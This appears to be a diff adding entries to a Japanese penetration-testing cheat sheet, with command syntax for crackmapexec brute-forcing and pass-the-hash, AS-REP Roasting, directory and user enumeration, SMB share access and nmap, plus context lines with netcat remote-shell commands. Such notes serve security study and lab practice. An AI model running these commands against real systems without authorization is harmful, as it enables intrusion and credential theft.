@@ -117,3 +117,167 @@ TCPやUDPなどのネットワーク接続を、コマンドラインを通じ�
 nc.exe <Target> <port> -e cmd.exe
 nc.exe <Target> <port> -e bash
 ```
+
+# crackmapexec
+ネットワーク上のホストを効率的に列挙したり、ブルートフォースを行うツール。
+```bash
+crackmapexec <Protocol> <Target> -u <Userlist> -p <Passwordlist> # プロトコルに対してユーザーリストとパスワードリストからログイン試行する
+crackmapexec <Protocol> <Target> -u <User> -p <Password> # 単一のユーザーとパスワードでログイン試行する
+--rid-brute # RID列挙
+--users # ユーザー列挙
+-H <ハッシュ> # NTハッシュを使用してログイン試行
+```
+
+# ffuf
+ディレクトリ列挙ツール。
+```bash
+ffuf -u <URL>/FUZZ -w <Wordlist> # ディレクトリ
+ffuf -u <URL> -H "Host: FUZZ.<Domain>" -w <Wordlist>
+-mc 200,301 # 200, 301のステータスコードのみ出力
+-fc 403 # 403を出力しない
+-fs 1234 # ページサイズの除外
+-H "Name: val" # ヘッダーの指定
+-t 100 # スレッド数
+-recursion # 回帰探索
+```
+
+# gobuster
+ディレクトリ列挙ツール。
+```bash
+gobuster dir -u <Target> -w <Wordlist> # ワードリストに該当するURLを検索
+gobuster vhost -u <Target> -w <Wordlist> --append-domain # サブドメインを検索
+-k # 証明書チェックをスキップ
+-t <Thread> # スレッド数を指定
+-b "<Status>" # 指定したステータスコードを除外(vhostでは使えない)
+-s "<Status>" # 指定したステータスコードのみを表示(vhostでは使えない)
+--exclude-length <レスポンスの長さ> # 指定したレスポンスの長さを除外
+--useragent "<任意>" # ユーザーエージェントを偽装
+-x <Extension> # 指定した拡張子を検索
+```
+
+## ffuf, gobusterで使用するファイルパス(kali linux)
+```bash
+# ディレクトリ検索
+/usr/share/wordlists/dirb/common.txt
+/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+/usr/share/wordlists/dirb/big.txt
+# サブドメイン検索
+/usr/share/seclists/Discovery/DNS/subdomains-<ワード数>.txt
+```
+
+# GetNPUsers
+AS-REP Roastingを自動で実行するツール。
+## AS-REP Roasting
+ドメインコントローラーに対して事前認証を必要としないユーザーのTGTの要求をし、パスワードハッシュを抜き出す攻撃。
+```bash
+impacket-GetNPUsers <Domain>/<User> -no-pass -dc-ip <Target> # AS-REP Roasting
+impacket-GetNPUsers <Domain>/ -no-pass -usersflie <Userlist> -dc-ip <Target> # ユーザーリストの名前でAS-REP Roasting
+# AS-REP
+# $krb5asrep$<Encryption type>$<User>@<Domain>:<salt>$<ユーザーのパスワードハッシュで暗号化された情報>
+# hashcat -m 18200
+```
+
+# ldapsearch
+LDAPサーバーに対して検索クエリを発行し、情報を取得するためのコマンドラインツール。
+## Command
+```bash
+ldapsearch -H ldap://<Target> -x -b "dc=<Domain>" # 匿名バインド
+ldapsearch -H ldap://<Target> -x -b "dc=<Domain>" -s sub "*" | grep -i lock # アカウントロックポリシー確認
+ldapsearch -H ldap://<Target> -D <User>@<Domain> -b "dc=<Domain>" -w '<Password>' "*" # 認証ありバインド
+```
+
+# lookupsid
+msrpc経由でSIDをブルートフォースし、ユーザー名やグループを列挙するツール。  
+## Command
+```bash
+impacket-lookupsid <User>@<Target> -no-pass
+impacket-lookupsid <User>@<Target> -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt # SidTypeUserだけを抜き出し、users.txtに保存。
+impacket-lookupsid <User>:<Password>@<Target> # 認証あり
+```
+
+# nikto
+Webサーバーに存在する脆弱性、設定ミス、古いソフトウェアなどを検出するための脆弱性スキャナーツール。
+## Command
+```bash
+nikto -h <Target> -p <Port>
+```
+
+# Nmap
+ターゲット端末上で実行されているソフトウェアの名称、バージョン、使用しているポートなどを特定することができるオープンソースのコマンドラインツール。
+## Command
+```bash
+nmap <Options> <Target>
+```
+## Options
+```bash
+-p 80 # 80番ポートのスキャン
+-p- # すべてのポートのスキャン
+-v # スキャン中に詳細な情報を表示
+-O # OSの特定
+-sC # 脆弱性の基本的なチェック
+-sV # サービスとそのバージョンの特定
+-sS # 完全な接続を確立しないSYNスキャン
+-sU # UDPポートのスキャン
+-Pn # pingを行わないスキャン
+--min-rate=5000 # 1秒間に最低5,000パケットを送信するスキャン
+-T4 高速スキャン
+```
+
+# smbclient
+LinuxからSMB共有にアクセスするためのコマンドラインツール
+## Command
+```bash
+smbclient //<Target>/<Share> -N # 匿名接続
+smbclient -L //<Target> -N # 匿名接続で共有フォルダを表示
+smbclient //<Target>/<Share -c <Command> # 匿名接続と同時にコマンドを実行
+smbclient //<Target>/<Share> -U <User> # ユーザーを指定して接続
+smbclient -k //<Target>/<Share> # Kerberos認証を使用して接続
+# 接続後
+get <File> # ファイルをダウンロード
+prompt OFF # 警告などの確認メッセージをオフにする
+recurse ON # ダウンロードする時などで再帰をオンにする
+mget * # すべてのファイルをダウンロード
+```
+
+# smbmap
+ネットワーク上のSMB/CIFS共有を探索するツール。
+## Command
+```bash
+smbmap -H <Target> -u guest -p "" # 匿名アクセス
+smbmap -H <Target> -u <User> -p "<Password>" # 認証ユーザーでアクセス
+smbmap -H <Target> -u <User> -p "<Password>" -r <Share> # 認証ユーザーで共有フォルダ内にアクセス
+```
+
+# username-anarchy
+名と姓から、その組織が使っていそうなユーザー名のパターンを全自動で生成するツール。
+
+## Command
+```bash
+username-anarchy --input-file unused.txt --select-format first, flast, first.last, firstl > used.txt
+
+# unused.txt
+# Taro Tanaka
+
+# used.txt
+# taro
+# taro.tanaka
+# tarot
+# ttanaka
+```
+
+# windapsearch
+Windowsドメイン内のユーザー、グループ、コンピュータ情報をLDAPクエリを使って列挙するツール。
+## Command
+```bash
+windapsearch -d <Domain> --dc-ip <Target> -U # 匿名バインド
+windapsearch -d <Domain> --dc-ip <Target> -U --custom "classObject=*"
+windapsearch -d <Domain> --dc-ip <Target> -U --custom "objectClass=*"
+windapsearch -d <Domain> --dc-ip <Target> -U --admin-objects
+windapsearch -m "Remote Management Users" -d<Domain> --dc-ip <Target> -U # WinRMグループ検索
+windapsearch -d <Domain> --dc-ip <Target> -U --full
+windapsearch --admin-objects -d <Domain> --dc-ip <Target> -u '<User>' -p '<Password>' # 認証ありバインド
+windapsearch -m "Remote Management Users" -d <Domain> --dc-ip <Target> -u '<User>' -p '<Password>'
+-U # 匿名バインド
+-u # ユーザー名
+-p # パスワード
+```
